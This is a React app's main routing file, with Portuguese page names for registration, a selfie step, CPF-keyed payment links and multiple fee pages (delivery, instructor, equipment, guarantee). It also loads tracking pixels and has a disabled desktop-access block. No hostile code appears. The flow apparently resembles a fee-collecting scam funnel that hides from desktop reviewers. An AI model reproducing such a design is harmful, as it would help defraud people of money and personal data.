import { useEffect } from "react";
import { Switch, Route, useLocation } from "wouter";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/not-found";
import Home from "@/pages/Home";
import Cadastro from "@/pages/Cadastro";
import Municipios from "@/pages/Municipios";
import Recebedor from "@/pages/Recebedor";
import Finalizacao from "@/pages/Finalizacao";
import Entrega from "@/pages/Entrega";
import EntregaCartao from "@/pages/EntregaCartao";
import Dashboard from "@/pages/Dashboard";
import Payment from "@/pages/Payment";
import Pay from "@/pages/Pay";
import TaxaEntrega from "@/pages/TaxaEntrega";
import Treinamento from "@/pages/Treinamento";
import TreinamentoApp from "@/pages/TreinamentoApp";
import PagamentoInstrutor from "@/pages/PagamentoInstrutor";
import Apostila from "@/pages/Apostila";
import Selfie from "@/pages/Selfie";
import CpfPayment from "@/pages/CpfPayment";
import InstallApp from "@/pages/InstallApp";
import AdminPanel from "@/pages/AdminPanel";
import AppPage from "@/pages/AppPage";
import Pagamento from "@/pages/Pagamento";
import Epi from "@/pages/Epi";
import Garantia from "@/pages/Garantia";
import { useAppContext } from "@/contexts/AppContext";
import { useDesktopProtection } from "@/hooks/use-desktop-protection";
import FacebookPixelInitializer from "@/components/FacebookPixelInitializer";
import ClarityInitializer from "@/components/ClarityInitializer";
import { TikTokChromeDetector } from "@/components/WhatsAppDetector";
import ServiceWorkerRegistration from "@/components/ServiceWorker";
import PWANotification from "@/components/PWANotification";

function Router() {
  return (
    <Switch>
      <Route path="/" component={Home} />
      <Route path="/cadastro" component={Cadastro} />
      <Route path="/municipios" component={Municipios} />
      <Route path="/selfie" component={Selfie} />
      <Route path="/recebedor" component={Recebedor} />
      <Route path="/finalizacao" component={Finalizacao} />
      <Route path="/entrega" component={Entrega} />
      <Route path="/entrega-cartao" component={EntregaCartao} />
      <Route path="/dashboard" component={Dashboard} />
      <Route path="/payment" component={Payment} />
      <Route path="/pay" component={Pay} />
      <Route path="/treinamento" component={Treinamento} />
      <Route path="/treinamento-app" component={TreinamentoApp} />
      <Route path="/pagamento-instrutor" component={PagamentoInstrutor} />
      <Route path="/apostila" component={Apostila} />
      <Route path="/pagamento" component={Pagamento} />
      <Route path="/epi" component={Epi} />
      <Route path="/p/:cpf" component={Epi} />
      <Route path="/garantia" component={Garantia} />
      <Route path="/instalar-app" component={InstallApp} />
      <Route path="/admin" component={AdminPanel} />
      <Route path="/app" component={AppPage} />
      <Route path="/a/:cpf" component={TaxaEntrega} />
      <Route path="/:cpf" component={Pay} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  const [location, setLocation] = useLocation();
  
  // LOG DE DEBUG PARA ROTA
  console.log('🎯 [APP] Localização atual:', location);
  
  // Scroll para o topo sempre que a rota mudar
  useEffect(() => {
    console.log('🎯 [APP] Mudança de rota detectada:', location);
    
    // Forçar scroll para o topo imediatamente
    window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
    
    // Backup com setTimeout para garantir que funcione mesmo com renderização assíncrona
    const timeoutId = setTimeout(() => {
      window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
      document.documentElement.scrollTop = 0;
      document.body.scrollTop = 0;
    }, 0);
    
    return () => clearTimeout(timeoutId);
  }, [location]);
  
  // Escutar mensagens do service worker para navegação automática
  useEffect(() => {
    const handleServiceWorkerMessage = (event: MessageEvent) => {
      console.log('💬 Mensagem recebida do service worker:', event.data);
      
      if (event.data?.action === 'navigate' && event.data?.url) {
        console.log('🔗 Navegando automaticamente para:', event.data.url);
        setLocation(event.data.url);
      }
    };

    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.addEventListener('message', handleServiceWorkerMessage);
      
      return () => {
        navigator.serviceWorker.removeEventListener('message', handleServiceWorkerMessage);
      };
    }
  }, [setLocation]);
  
  // TEMPORARIAMENTE DESABILITADO - Proteção contra acesso desktop 
  // useDesktopProtection();
  
  return (
    <TooltipProvider>
      <Toaster />
      <FacebookPixelInitializer />
      <ClarityInitializer />
      <ServiceWorkerRegistration />
      <PWANotification />
      <TikTokChromeDetector>
        <Router />
      </TikTokChromeDetector>
    </TooltipProvider>
  );
}

export default App;